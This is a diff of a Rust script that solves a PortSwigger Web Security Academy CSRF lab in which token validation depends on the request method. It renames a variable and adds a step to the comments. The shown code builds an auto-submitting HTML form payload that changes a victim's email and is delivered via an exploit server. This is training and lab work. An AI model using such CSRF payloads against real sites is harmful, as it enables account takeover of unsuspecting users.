@@ -6,8 +6,10 @@
 *
 * Lab: CSRF where token validation depends on request method
 *
-* Steps: 1. Deliver the exploit to the victim
-*        2. The victim's email will be changed after he trigger the exploit
+* Steps: 1. Craft an HTML form for changing the email address that includes an 
+*           auto-submit script and uses the GET method rather than POST
+*        2. Deliver the exploit to the victim
+*        3. The victim's email will be changed after he trigger the exploit
 *
 *********************************************************************************/
 #![allow(unused)]
@@ -31,7 +33,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0ab6009f047e2b0787adb80100fc00ad.web-security-academy.net";
+    let lab_url = "https://0ab6009f047e2b0787adb80100fc00ad.web-security-academy.net";
 
     // change this to your exploit server URL
     let exploit_server_url = "https://exploit-0aca00a204332be087a8b70c018f002e.exploit-server.net";
@@ -50,7 +52,7 @@ fn main() {
     let payload = format!(
         r###"<html>
                 <body>
-                <form action="{url}/my-account/change-email">
+                <form action="{lab_url}/my-account/change-email">
                     <input type="hidden" name="email" value="{new_email}" />
                     <input type="hidden" name="csrf" value="b2eUm7UybY24D3Jjnda5t2OUib3N2Cvr" />
                     <input type="submit" value="Submit request" />
